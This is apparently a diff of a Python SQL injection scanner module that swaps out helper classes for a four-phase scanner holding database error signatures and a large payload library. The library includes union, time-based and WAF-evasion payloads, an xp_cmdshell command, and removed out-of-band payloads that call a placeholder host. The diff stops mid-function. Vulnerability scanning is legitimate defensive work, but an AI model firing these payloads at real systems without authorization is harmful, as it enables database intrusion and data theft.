@@ -1,602 +1,306 @@
-"""Enhanced SQL Injection Scanner Module - Industry-Grade Detection with Performance & Security Improvements."""
+"""
+Enhanced SQL Injection Scanner with Comprehensive 4-Phase Methodology
+
+This scanner implements a thorough SQL injection testing approach:
+Phase 1: Discovery/Crawling - Spider website and find all injection points
+Phase 2: Analysis - Fingerprint database and establish baselines
+Phase 3: Testing - Execute comprehensive injection techniques
+Phase 4: Verification - Confirm vulnerabilities and assess impact
+
+Author: SENTINAL Security Scanner
+Version: 2.0
+"""
 
 import asyncio
-import subprocess
 import json
-import tempfile
-import os
-import statistics
 import time
 import hashlib
 import logging
-import shlex
-from typing import Dict, List, Any, Optional, Tuple, Set, Pattern, Union
-from datetime import datetime
-from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote, unquote
-from collections import defaultdict
-from functools import lru_cache
-from contextlib import asynccontextmanager
 import re
+import statistics
+from typing import Dict, List, Any, Optional, Tuple, Set
+from datetime import datetime
+from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
+from collections import defaultdict
 import httpx
 from bs4 import BeautifulSoup
+
+# Pyppeteer for SPA support
+try:
+    from pyppeteer import launch
+    PYPPETEER_AVAILABLE = True
+except ImportError:
+    PYPPETEER_AVAILABLE = False
+    logging.warning("Pyppeteer not available. Install with: pip install pyppeteer")
+
 from ..base_module import (
-    BaseScannerModule,
-    ScanConfig,
-    ScanResult,
-    Vulnerability,
-    SeverityLevel,
-    ScanType
+    BaseScannerModule, ScanConfig, ScanResult, Vulnerability, 
+    SeverityLevel, ScanType
 )
 
-# Configure logging
 logger = logging.getLogger(__name__)
 
 
-class ConnectionPool:
-    """HTTP connection pool manager for improved performance."""
+class InjectionPoint:
+    """Represents a potential SQL injection point."""
     
-    def __init__(self, max_connections: int = 10, max_keepalive: int = 5):
-        self.max_connections = max_connections
-        self.max_keepalive = max_keepalive
-        self._pools: Dict[str, httpx.AsyncClient] = {}
+    def __init__(self, url: str, method: str, param_name: str, param_value: str, 
+                 param_type: str, context: Dict[str, Any] = None):
+        self.url = url
+        self.method = method
+        self.param_name = param_name
+        self.param_value = param_value
+        self.param_type = param_type  # 'query', 'post', 'json', 'cookie', 'header'
+        self.context = context or {}
+        self.tested = False
+        self.vulnerable = False
     
-    @asynccontextmanager
-    async def get_client(self, base_url: str) -> httpx.AsyncClient:
-        """Get or create a client for the given base URL."""
-        parsed = urlparse(base_url)
-        pool_key = f"{parsed.scheme}://{parsed.netloc}"
-        
-        if pool_key not in self._pools:
-            limits = httpx.Limits(
-                max_connections=self.max_connections,
-                max_keepalive_connections=self.max_keepalive
-            )
-            self._pools[pool_key] = httpx.AsyncClient(
-                verify=False,
-                timeout=httpx.Timeout(15.0),
-                limits=limits,
-                follow_redirects=True
-            )
-        
-        try:
-            yield self._pools[pool_key]
-        except Exception as e:
-            logger.error(f"Connection pool error: {e}")
-            raise
+    def __hash__(self):
+        return hash(f"{self.url}:{self.method}:{self.param_name}:{self.param_type}")
     
-    async def close_all(self):
-        """Close all connection pools."""
-        for client in self._pools.values():
-            await client.aclose()
-        self._pools.clear()
-
-
-class CircuitBreaker:
-    """Circuit breaker pattern for handling failing endpoints."""
-    
-    def __init__(self, failure_threshold: int = 5, recovery_timeout: int = 60):
-        self.failure_threshold = failure_threshold
-        self.recovery_timeout = recovery_timeout
-        self._failures: Dict[str, int] = defaultdict(int)
-        self._last_failure_time: Dict[str, float] = {}
-        self._circuit_open: Dict[str, bool] = defaultdict(bool)
-    
-    def is_open(self, endpoint: str) -> bool:
-        """Check if circuit is open for the endpoint."""
-        if not self._circuit_open[endpoint]:
-            return False
-        
-        # Check if recovery timeout has passed
-        if time.time() - self._last_failure_time.get(endpoint, 0) > self.recovery_timeout:
-            self._reset(endpoint)
-            return False
-        
-        return True
-    
-    def record_success(self, endpoint: str):
-        """Record a successful request."""
-        self._reset(endpoint)
-    
-    def record_failure(self, endpoint: str):
-        """Record a failed request."""
-        self._failures[endpoint] += 1
-        self._last_failure_time[endpoint] = time.time()
-        
-        if self._failures[endpoint] >= self.failure_threshold:
-            self._circuit_open[endpoint] = True
-            logger.warning(f"Circuit breaker opened for {endpoint}")
-    
-    def _reset(self, endpoint: str):
-        """Reset the circuit breaker for an endpoint."""
-        self._failures[endpoint] = 0
-        self._circuit_open[endpoint] = False
-        if endpoint in self._last_failure_time:
-            del self._last_failure_time[endpoint]
-
-
-class ResponseCache:
-    """Cache for baseline responses to improve performance."""
-    
-    def __init__(self, max_size: int = 100, ttl: int = 300):
-        self.max_size = max_size
-        self.ttl = ttl
-        self._cache: Dict[str, Tuple[Any, float]] = {}
-    
-    def get(self, key: str) -> Optional[Any]:
-        """Get cached response if valid."""
-        if key in self._cache:
-            value, timestamp = self._cache[key]
-            if time.time() - timestamp < self.ttl:
-                return value
-            else:
-                del self._cache[key]
-        return None
-    
-    def set(self, key: str, value: Any):
-        """Cache a response."""
-        # Implement simple LRU by removing oldest if at capacity
-        if len(self._cache) >= self.max_size:
-            oldest_key = min(self._cache.keys(), 
-                           key=lambda k: self._cache[k][1])
-            del self._cache[oldest_key]
-        
-        self._cache[key] = (value, time.time())
-    
-    def clear(self):
-        """Clear the cache."""
-        self._cache.clear()
-
-
-class WebCrawler:
-    """Web crawler to discover URLs and forms for SQL injection testing."""
-    
-    def __init__(self, max_depth: int = 3, max_urls: int = 50):
-        self.max_depth = max_depth
-        self.max_urls = max_urls
-        self.visited_urls: Set[str] = set()
-        self.discovered_urls: List[str] = []
-        self.forms: List[Dict[str, Any]] = []
-        self.urls_with_params: List[str] = []
-        
-    async def crawl(self, start_url: str, pool: ConnectionPool) -> Dict[str, Any]:
-        """Crawl website starting from the given URL."""
-        self.visited_urls.clear()
-        self.discovered_urls.clear()
-        self.forms.clear()
-        self.urls_with_params.clear()
-        
-        await self._crawl_recursive(start_url, 0, pool)
-        
-        return {
-            'discovered_urls': self.discovered_urls,
-            'forms': self.forms,
-            'urls_with_params': self.urls_with_params,
-            'total_urls': len(self.discovered_urls)
-        }
-    
-    async def _crawl_recursive(self, url: str, depth: int, pool: ConnectionPool):
-        """Recursively crawl URLs."""
-        if depth > self.max_depth or len(self.discovered_urls) >= self.max_urls:
-            return
-        
-        if url in self.visited_urls:
-            return
-        
-        self.visited_urls.add(url)
-        self.discovered_urls.append(url)
-        
-        # Check if URL has parameters
-        parsed = urlparse(url)
-        if parsed.query:
-            self.urls_with_params.append(url)
-        
-        try:
-            async with pool.get_client(url) as client:
-                response = await client.get(url, timeout=10)
-                
-                if response.status_code != 200:
-                    return
-                
-                soup = BeautifulSoup(response.text, 'html.parser')
-                
-                # Extract forms
-                forms = soup.find_all('form')
-                for form in forms:
-                    form_data = self._extract_form_data(form, url)
-                    if form_data:
-                        self.forms.append(form_data)
-                
-                # Extract links
-                links = soup.find_all('a', href=True)
-                for link in links:
-                    href = link['href']
-                    absolute_url = urljoin(url, href)
-                    
-                    # Only crawl same domain
-                    if urlparse(absolute_url).netloc == urlparse(url).netloc:
-                        if absolute_url not in self.visited_urls:
-                            await self._crawl_recursive(absolute_url, depth + 1, pool)
-                
-                # Extract URLs from JavaScript
-                js_urls = re.findall(r'["\']([^"\']*\?[^"\']*=[^"\']*)["\'"]', response.text)
-                for js_url in js_urls:
-                    absolute_url = urljoin(url, js_url)
-                    if urlparse(absolute_url).netloc == urlparse(url).netloc:
-                        if absolute_url not in self.visited_urls and '?' in absolute_url:
-                            self.urls_with_params.append(absolute_url)
-                            self.discovered_urls.append(absolute_url)
-                
-        except Exception as e:
-            logger.debug(f"Error crawling {url}: {e}")
-    
-    def _extract_form_data(self, form, base_url: str) -> Optional[Dict[str, Any]]:
-        """Extract form data for testing."""
-        try:
-            action = form.get('action', '')
-            method = form.get('method', 'GET').upper()
-            
-            if not action:
-                action = base_url
-            else:
-                action = urljoin(base_url, action)
-            
-            inputs = []
-            for input_tag in form.find_all(['input', 'textarea', 'select']):
-                input_name = input_tag.get('name')
-                if input_name:
-                    input_type = input_tag.get('type', 'text')
-                    inputs.append({
-                        'name': input_name,
-                        'type': input_type,
-                        'value': input_tag.get('value', '')
-                    })
-            
-            if inputs:
-                return {
-                    'action': action,
-                    'method': method,
-                    'inputs': inputs,
-                    'source_url': base_url
-                }
-        except Exception as e:
-            logger.debug(f"Error extracting form data: {e}")
-        
-        return None
-
-
-class PayloadGenerator:
-    """Dynamic SQL injection payload generator with enhanced capabilities."""
-    
-    def __init__(self):
-        self.database_signatures = {
-            'mysql': ['mysql', 'maria', 'percona'],
-            'postgresql': ['postgres', 'psql', 'pg_'],
-            'mssql': ['microsoft sql', 'mssql', 'sql server'],
-            'oracle': ['oracle', 'ora-'],
-            'sqlite': ['sqlite'],
-            'mongodb': ['mongodb', 'mongo'],
-            'cosmosdb': ['cosmos', 'documentdb'],
-            'cassandra': ['cassandra', 'cql']
-        }
-        
-    def generate_payloads(self, context: str = 'generic', db_type: Optional[str] = None) -> List[Dict[str, Any]]:
-        """Generate context-aware payloads."""
-        payloads = []
-        
-        # Basic error-based payloads
-        payloads.extend(self._get_error_based_payloads(db_type))
-        
-        # Context-specific payloads
-        if context == 'where':
-            payloads.extend(self._get_where_clause_payloads(db_type))
-        elif context == 'order_by':
-            payloads.extend(self._get_order_by_payloads(db_type))
-        elif context == 'union':
-            payloads.extend(self._get_union_payloads(db_type))
-        
-        # Time-based blind payloads
-        payloads.extend(self._get_time_based_payloads(db_type))
-        
-        # Boolean-based blind payloads
-        payloads.extend(self._get_boolean_payloads())
-        
-        # WAF evasion variants
-        payloads.extend(self._get_evasion_payloads(db_type))
-        
-        return payloads
-    
-    def _get_error_based_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
-        """Get error-based payloads."""
-        base_payloads = [
-            {"payload": "'", "type": "error-based", "description": "Single quote"},
-            {"payload": "\"", "type": "error-based", "description": "Double quote"},
-            {"payload": "')", "type": "error-based", "description": "Quote with parenthesis"},
-            {"payload": "'))", "type": "error-based", "description": "Quote with double parenthesis"},
-        ]
-        
-        if not db_type or db_type == 'mysql':
-            base_payloads.extend([
-                {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--", "type": "error-based", "description": "MySQL EXTRACTVALUE"},
-                {"payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "type": "error-based", "description": "MySQL double query"},
-            ])
-        
-        if not db_type or db_type == 'postgresql':
-            base_payloads.extend([
-                {"payload": "' AND 1=CAST((SELECT version()) AS int)--", "type": "error-based", "description": "PostgreSQL type casting"},
-            ])
-        
-        if not db_type or db_type == 'mssql':
-            base_payloads.extend([
-                {"payload": "' AND 1=CONVERT(int,@@version)--", "type": "error-based", "description": "MSSQL type conversion"},
-            ])
-        
-        return base_payloads
-    
-    def _get_where_clause_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
-        """Get WHERE clause specific payloads."""
-        return [
-            {"payload": "' OR '1'='1", "type": "boolean-where", "description": "Always true condition"},
-            {"payload": "' OR '1'='1' --", "type": "boolean-where", "description": "Always true with comment"},
-            {"payload": "' OR 1=1 --", "type": "boolean-where", "description": "Numeric always true"},
-            {"payload": "admin' --", "type": "auth-bypass", "description": "Admin bypass"},
-        ]
-    
-    def _get_order_by_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
-        """Get ORDER BY clause specific payloads."""
-        payloads = [
-            {"payload": "1 ASC", "type": "order-by", "description": "Valid ORDER BY"},
-            {"payload": "1 DESC", "type": "order-by", "description": "Valid ORDER BY DESC"},
-        ]
-        
-        if not db_type or db_type == 'mysql':
-            payloads.append({"payload": "(SELECT IF(1=1,1,(SELECT 1 UNION SELECT 2)))", "type": "order-by-blind", "description": "MySQL ORDER BY blind"})
-        
-        return payloads
-    
-    def _get_union_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
-        """Get UNION-based payloads."""
-        return [
-            {"payload": "' UNION SELECT NULL--", "type": "union", "description": "UNION 1 column"},
-            {"payload": "' UNION SELECT NULL,NULL--", "type": "union", "description": "UNION 2 columns"},
-            {"payload": "' UNION SELECT NULL,NULL,NULL--", "type": "union", "description": "UNION 3 columns"},
-            {"payload": "' UNION SELECT 1,2,3--", "type": "union", "description": "UNION numeric values"},
-            {"payload": "' UNION ALL SELECT NULL--", "type": "union", "description": "UNION ALL 1 column"},
-        ]
-    
-    def _get_time_based_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
-        """Get time-based blind payloads."""
-        payloads = []
-        
-        if not db_type or db_type == 'mysql':
-            payloads.extend([
-                {"payload": "' AND SLEEP(5)--", "type": "time-based", "delay": 5, "description": "MySQL SLEEP"},
-                {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "type": "time-based", "delay": 5, "description": "MySQL nested SLEEP"},
-                {"payload": "' AND IF(1=1,SLEEP(5),0)--", "type": "time-based", "delay": 5, "description": "MySQL conditional SLEEP"},
-            ])
-        
-        if not db_type or db_type == 'postgresql':
-            payloads.extend([
-                {"payload": "'; SELECT pg_sleep(5)--", "type": "time-based", "delay": 5, "description": "PostgreSQL pg_sleep"},
-                {"payload": "' AND 1=(SELECT 1 FROM pg_sleep(5))--", "type": "time-based", "delay": 5, "description": "PostgreSQL nested sleep"},
-            ])
-        
-        if not db_type or db_type == 'mssql':
-            payloads.extend([
-                {"payload": "'; WAITFOR DELAY '00:00:05'--", "type": "time-based", "delay": 5, "description": "MSSQL WAITFOR"},
-                {"payload": "' IF 1=1 WAITFOR DELAY '00:00:05'--", "type": "time-based", "delay": 5, "description": "MSSQL conditional WAITFOR"},
-            ])
-        
-        if not db_type or db_type == 'oracle':
-            payloads.extend([
-                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--", "type": "time-based", "delay": 5, "description": "Oracle DBMS_PIPE"},
-            ])
-        
-        return payloads
-    
-    def _get_boolean_payloads(self) -> List[Dict[str, Any]]:
-        """Get boolean-based blind payloads."""
-        return [
-            {"payload": "' AND '1'='1", "type": "boolean-true", "description": "True condition"},
-            {"payload": "' AND '1'='2", "type": "boolean-false", "description": "False condition"},
-            {"payload": "' AND 1=1--", "type": "boolean-true", "description": "Numeric true"},
-            {"payload": "' AND 1=2--", "type": "boolean-false", "description": "Numeric false"},
-            {"payload": "' AND 'a'='a", "type": "boolean-true", "description": "String true"},
-            {"payload": "' AND 'a'='b", "type": "boolean-false", "description": "String false"},
-        ]
-    
-    def _get_evasion_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
-        """Get WAF evasion payloads."""
-        return [
-            {"payload": "'/**/OR/**/1=1--", "type": "evasion-comment", "description": "Comment-based evasion"},
-            {"payload": "'+OR+1=1--", "type": "evasion-plus", "description": "Plus sign evasion"},
-            {"payload": "'||'1'='1", "type": "evasion-concat", "description": "Concatenation evasion"},
-            {"payload": "%27%20OR%201=1--", "type": "evasion-encoded", "description": "URL encoded"},
-            {"payload": "' /*!50000OR*/ 1=1--", "type": "evasion-version", "description": "MySQL version comment"},
-            {"payload": "' %0aOR%0a1=1--", "type": "evasion-newline", "description": "Newline evasion"},
-            {"payload": "' %09OR%091=1--", "type": "evasion-tab", "description": "Tab evasion"},
-        ]
-    
-    def detect_database_type(self, error_text: str) -> Optional[str]:
-        """Detect database type from error messages."""
-        error_lower = error_text.lower()
-        
-        for db_type, signatures in self.database_signatures.items():
-            for signature in signatures:
-                if signature in error_lower:
-                    return db_type
-        
-        return None
-
-
-class OOBDetector:
-    """Out-of-Band SQL injection detector."""
-    
-    def __init__(self, domain: str = None):
-        self.domain = domain or "oob-sqli-test.example.com"
-        self.interactions = {}
-    
-    def generate_oob_payload(self, param_name: str, db_type: str = 'mysql') -> Tuple[str, str]:
-        """Generate OOB payload and unique identifier."""
-        unique_id = hashlib.md5(f"{param_name}{time.time()}".encode()).hexdigest()[:8]
-        subdomain = f"{unique_id}.{self.domain}"
-        
-        # Fixed: Properly quote subdomain to prevent injection
-        payloads = {
-            'mysql': f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{subdomain}','\\\\test'))--",
-            'mssql': f"'; EXEC master..xp_dirtree '\\\\{subdomain}\\test'--",
-            'oracle': f"' UNION SELECT UTL_INADDR.get_host_address('{subdomain}') FROM dual--",
-            'postgresql': f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}'--",
-        }
-        
-        payload = payloads.get(db_type, payloads['mysql'])
-        return payload, unique_id
-    
-    def check_interaction(self, unique_id: str) -> bool:
-        """Check if OOB interaction occurred (stub - needs DNS/HTTP server)."""
-        # In production, this would check DNS logs or HTTP callbacks
-        # For now, return False as we don't have the infrastructure
-        return False
+    def __eq__(self, other):
+        return (self.url == other.url and self.method == other.method and 
+                self.param_name == other.param_name and self.param_type == other.param_type)
 
 
 class SQLInjectionScanner(BaseScannerModule):
-    """Enhanced SQL Injection vulnerability scanner."""
+    """
+    Comprehensive SQL Injection Scanner with 4-Phase Methodology.
     
-    # Configuration constants
-    MAX_PAYLOADS_PER_PARAM = 20
-    BASELINE_REQUESTS = 5
-    TIME_BASED_REQUESTS = 3
-    STATISTICAL_Z_THRESHOLD = 2.0
-    MIN_TIME_DELAY = 0.8  # 80% of expected delay
+    Phases:
+    1. Discovery/Crawling - Find all entry points (URLs, forms, parameters)
+    2. Analysis - Fingerprint database and establish response baselines
+    3. Testing - Execute error-based, boolean-based, time-based, union-based tests
+    4. Verification - Confirm findings and assess exploitability
+    """
     
-    # Detection thresholds
-    ERROR_CONFIDENCE_THRESHOLD = 0.7
-    BOOLEAN_CONFIDENCE_THRESHOLD = 0.6
-    LENGTH_DIFF_THRESHOLD = 100
+    # SQL Error Patterns by Database Type (pattern, confidence, db_type)
+    SQL_ERRORS = [
+        # MySQL
+        (r"SQL syntax.*MySQL", 0.95, "MySQL"),
+        (r"Warning.*mysql_", 0.90, "MySQL"),
+        (r"valid MySQL result", 0.90, "MySQL"),
+        (r"MySqlClient\.", 0.90, "MySQL"),
+        (r"com\.mysql\.jdbc", 0.95, "MySQL"),
+        (r"MySQL Query fail", 0.90, "MySQL"),
+        (r"SQL syntax.*MariaDB", 0.95, "MariaDB"),
+        
+        # PostgreSQL
+        (r"PostgreSQL.*ERROR", 0.95, "PostgreSQL"),
+        (r"Warning.*\Wpg_", 0.90, "PostgreSQL"),
+        (r"valid PostgreSQL result", 0.90, "PostgreSQL"),
+        (r"Npgsql\.", 0.90, "PostgreSQL"),
+        (r"PG::SyntaxError", 0.95, "PostgreSQL"),
+        (r"org\.postgresql\.util\.PSQLException", 0.95, "PostgreSQL"),
+        
+        # Microsoft SQL Server
+        (r"Driver.*SQL[\-\_\ ]*Server", 0.90, "MSSQL"),
+        (r"OLE DB.*SQL Server", 0.90, "MSSQL"),
+        (r"\[SQL Server\]", 0.90, "MSSQL"),
+        (r"Warning.*mssql_", 0.90, "MSSQL"),
+        (r"System\.Data\.SqlClient\.SqlException", 0.95, "MSSQL"),
+        (r"Microsoft SQL Native Client error", 0.95, "MSSQL"),
+        
+        # Oracle
+        (r"\bORA-[0-9][0-9][0-9][0-9]", 0.95, "Oracle"),
+        (r"Oracle error", 0.90, "Oracle"),
+        (r"Oracle.*Driver", 0.90, "Oracle"),
+        (r"Warning.*\Woci_", 0.90, "Oracle"),
+        (r"Warning.*\Wora_", 0.90, "Oracle"),
+        
+        # SQLite
+        (r"SQLite/JDBCDriver", 0.90, "SQLite"),
+        (r"SQLite\.Exception", 0.95, "SQLite"),
+        (r"System\.Data\.SQLite\.SQLiteException", 0.95, "SQLite"),
+        (r"Warning.*sqlite_", 0.90, "SQLite"),
+        (r"SQLITE_ERROR", 0.95, "SQLite"),
+        (r"sqlite3\.OperationalError", 0.95, "SQLite"),
+        
+        # Generic SQL Errors
+        (r"SQL syntax", 0.70, "Generic"),
+        (r"syntax error", 0.60, "Generic"),
+        (r"unclosed quotation mark", 0.80, "Generic"),
+        (r"quoted string not properly terminated", 0.80, "Generic"),
+        (r"SQL command not properly ended", 0.75, "Generic"),
+        (r"Incorrect syntax near", 0.75, "Generic"),
+    ]
     
-    # Compiled regex patterns (class level for efficiency)
-    FORM_PATTERN = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
-    INPUT_PATTERN = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
+    # Comprehensive Payload Library
+    PAYLOADS = {
+        'error_based': {
+            'generic': [
+                "'",
+                "\"",
+                "')",
+                "';",
+                "' OR '1",
+                "' OR 1=1--",
+                "\" OR \"1",
+                "\" OR 1=1--",
+                "') OR ('1",
+                "\") OR (\"1",
+            ],
+            'mysql': [
+                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+                "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)--",
+                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+                "' AND EXP(~(SELECT * FROM (SELECT VERSION())x))--",
+            ],
+            'postgresql': [
+                "' AND 1=CAST((SELECT version()) AS int)--",
+                "' AND 1=CAST((SELECT current_database()) AS int)--",
+                "' AND 1=CAST((SELECT current_user) AS int)--",
+            ],
+            'mssql': [
+                "' AND 1=CONVERT(int,@@version)--",
+                "' AND 1=CONVERT(int,DB_NAME())--",
+                "' AND 1=CONVERT(int,USER_NAME())--",
+            ],
+            'oracle': [
+                "' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--",
+                "' AND 1=CAST((SELECT user FROM dual) AS int)--",
+            ],
+        },
+        'boolean_based': {
+            'generic': [
+                ("' OR '1'='1", "' OR '1'='2"),  # True/False pair
+                ("' OR 1=1--", "' OR 1=2--"),
+                ("' AND '1'='1", "' AND '1'='2"),
+                ("' AND 1=1--", "' AND 1=2--"),
+                ("') OR ('1'='1", "') OR ('1'='2"),
+                ("\") OR (\"1\"=\"1", "\") OR (\"1\"=\"2"),
+            ],
+            'mysql': [
+                ("' AND SUBSTRING(VERSION(),1,1)>'0'--", "' AND SUBSTRING(VERSION(),1,1)>'9'--"),
+                ("' AND LENGTH(DATABASE())>0--", "' AND LENGTH(DATABASE())>999--"),
+                ("' AND ASCII(SUBSTRING(DATABASE(),1,1))>64--", "' AND ASCII(SUBSTRING(DATABASE(),1,1))>200--"),
+            ],
+            'postgresql': [
+                ("' AND SUBSTRING(version(),1,1)>'0'--", "' AND SUBSTRING(version(),1,1)>'z'--"),
+                ("' AND LENGTH(current_database())>0--", "' AND LENGTH(current_database())>999--"),
+            ],
+            'mssql': [
+                ("' AND SUBSTRING(@@version,1,1)>'0'--", "' AND SUBSTRING(@@version,1,1)>'z'--"),
+                ("' AND LEN(DB_NAME())>0--", "' AND LEN(DB_NAME())>999--"),
+            ],
+        },
+        'time_based': {
+            'mysql': [
+                ("' AND SLEEP(5)--", 5),
+                ("' AND IF(1=1,SLEEP(5),0)--", 5),
+                ("' AND (SELECT SLEEP(5))--", 5),
+                ("' AND BENCHMARK(5000000,MD5('test'))--", 3),
+                ("'; SELECT SLEEP(5)--", 5),
+            ],
+            'postgresql': [
+                ("'; SELECT pg_sleep(5)--", 5),
+                ("' AND (SELECT pg_sleep(5))--", 5),
+                ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
+            ],
+            'mssql': [
+                ("'; WAITFOR DELAY '00:00:05'--", 5),
+                ("'; IF (1=1) WAITFOR DELAY '00:00:05'--", 5),
+                ("' WAITFOR DELAY '00:00:05'--", 5),
+            ],
+            'oracle': [
+                ("' AND DBMS_LOCK.SLEEP(5)--", 5),
+                ("'; BEGIN DBMS_LOCK.SLEEP(5); END;--", 5),
+            ],
+            'sqlite': [
+                ("' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%' AND RANDOMBLOB(50000000))--", 3),
+            ],
+        },
+        'union_based': {
+            'generic': [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+                "' UNION ALL SELECT NULL--",
+                "' UNION ALL SELECT NULL,NULL--",
+                "' UNION ALL SELECT NULL,NULL,NULL--",
+            ],
+            'mysql': [
+                "' UNION SELECT VERSION(),DATABASE(),USER()--",
+                "' UNION SELECT NULL,VERSION(),NULL--",
+                "' UNION SELECT NULL,DATABASE(),NULL--",
+                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+                "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=DATABASE()--",
+            ],
+            'postgresql': [
+                "' UNION SELECT NULL,version(),NULL--",
+                "' UNION SELECT NULL,current_database(),NULL--",
+                "' UNION SELECT NULL,current_user,NULL--",
+            ],
+            'mssql': [
+                "' UNION SELECT NULL,@@version,NULL--",
+                "' UNION SELECT NULL,DB_NAME(),NULL--",
+                "' UNION SELECT NULL,USER_NAME(),NULL--",
+            ],
+        },
+        'stacked_queries': {
+            'generic': [
+                "'; SELECT 1--",
+                "'; SELECT SLEEP(1)--",
+            ],
+            'mssql': [
+                "'; EXEC xp_cmdshell('whoami')--",
+                "'; DECLARE @test VARCHAR(8000) SET @test='test'; SELECT @test--",
+            ],
+        },
+    }
+    
+    # Database Fingerprinting Payloads
+    DB_FINGERPRINTS = {
+        'MySQL': [
+            ("' AND @@version LIKE '%'--", r"mysql|mariadb", 0.90),
+            ("' AND CONNECTION_ID()>0--", r"", 0.70),
+        ],
+        'PostgreSQL': [
+            ("' AND version() LIKE '%PostgreSQL%'--", r"postgresql", 0.90),
+            ("' AND current_database() LIKE '%'--", r"", 0.70),
+        ],
+        'MSSQL': [
+            ("' AND @@version LIKE '%Microsoft%'--", r"microsoft|sql server", 0.90),
+            ("' AND DB_NAME() LIKE '%'--", r"", 0.70),
+        ],
+        'Oracle': [
+            ("' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'--", r"oracle", 0.90),
+        ],
+        'SQLite': [
+            ("' AND sqlite_version() LIKE '%'--", r"sqlite", 0.90),
+        ],
+    }
     
     def __init__(self):
         super().__init__()
         self.name = "SQLInjectionScanner"
-        self.description = "Industry-grade SQL injection vulnerability scanner with crawling support"
+        self.description = "Comprehensive SQL injection scanner with 4-phase methodology"
         self.scan_type = ScanType.ACTIVE
-        self.payload_generator = PayloadGenerator()
-        self.oob_detector = OOBDetector()
-        self.logger = logging.getLogger(__name__)
-        self._last_request_time = 0
+        self.client = None
+        self.injection_points: Set[InjectionPoint] = set()
+        self.baselines: Dict[str, Dict] = {}
+        self.detected_db: Optional[str] = None
+        self.waf_detected = False
+        self.crawled_urls: Set[str] = set()
+        self.tested_points: Set[InjectionPoint] = set()
         
-        # Initialize connection pool, circuit breaker, and cache
-        self.connection_pool = ConnectionPool(max_connections=10, max_keepalive=5)
-        self.circuit_breaker = CircuitBreaker(failure_threshold=5, recovery_timeout=60)
-        self.response_cache = ResponseCache(max_size=100, ttl=300)
-        
-        # Initialize web crawler
-        self.crawler = WebCrawler(max_depth=3, max_urls=50)
-        
-        # SQL error patterns with severity indicators
-        self.sql_error_patterns = [
-            # MySQL - High confidence
-            (r"SQL syntax.*MySQL", 0.95, "MySQL"),
-            (r"Warning.*mysql_", 0.95, "MySQL"),
-            (r"MySqlException", 0.95, "MySQL"),
-            (r"com\.mysql\.jdbc", 0.95, "MySQL"),
-            
-            # PostgreSQL - High confidence
-            (r"PostgreSQL.*ERROR", 0.95, "PostgreSQL"),
-            (r"Warning.*\Wpg_", 0.95, "PostgreSQL"),
-            (r"Npgsql\.", 0.95, "PostgreSQL"),
-            (r"org\.postgresql\.util\.PSQLException", 0.95, "PostgreSQL"),
-            
-            # MS SQL Server - High confidence
-            (r"Driver.*SQL[\-\_\ ]*Server", 0.95, "MSSQL"),
-            (r"OLE DB.*SQL Server", 0.95, "MSSQL"),
-            (r"SQLServer.*JDBC", 0.95, "MSSQL"),
-            (r"System\.Data\.SqlClient\.SqlException", 0.95, "MSSQL"),
-            
-            # Oracle - High confidence
-            (r"ORA-\d{5}", 0.95, "Oracle"),
-            (r"Oracle.*Driver", 0.95, "Oracle"),
-            (r"oracle\.jdbc", 0.95, "Oracle"),
-            
-            # SQLite - High confidence
-            (r"SQLite/JDBCDriver", 0.95, "SQLite"),
-            (r"SQLite\.Exception", 0.95, "SQLite"),
-            (r"System\.Data\.SQLite\.SQLiteException", 0.95, "SQLite"),
-            
-            # Generic SQL errors - Medium confidence
-            (r"SQL error", 0.7, "Generic"),
-            (r"syntax error", 0.6, "Generic"),
-            (r"database error", 0.7, "Generic"),
-            (r"Incorrect syntax near", 0.8, "Generic"),
-            (r"Unclosed quotation mark", 0.8, "Generic"),
-            (r"quoted string not properly terminated", 0.8, "Generic"),
-        ]
-    
-    def __del__(self):
-        """Cleanup resources on deletion."""
-        if hasattr(self, 'connection_pool'):
-            asyncio.create_task(self.connection_pool.close_all())
-    
-    def validate_target(self, target: str) -> bool:
-        """Validate if target is suitable for SQL injection testing."""
-        if not target:
-            return False
-        
-        # Ensure proper URL format
-        if not target.startswith(('http://', 'https://')):
-            target = f"https://{target}"
-        
-        try:
-            parsed = urlparse(target)
-            # Check for valid scheme and netloc
-            if not (parsed.scheme in ['http', 'https'] and parsed.netloc):
-                return False
-            
-            # Security check: avoid scanning internal/local addresses in production
-            # (can be configured via environment variable)
-            if os.getenv('BLOCK_INTERNAL_SCAN', 'false').lower() == 'true':
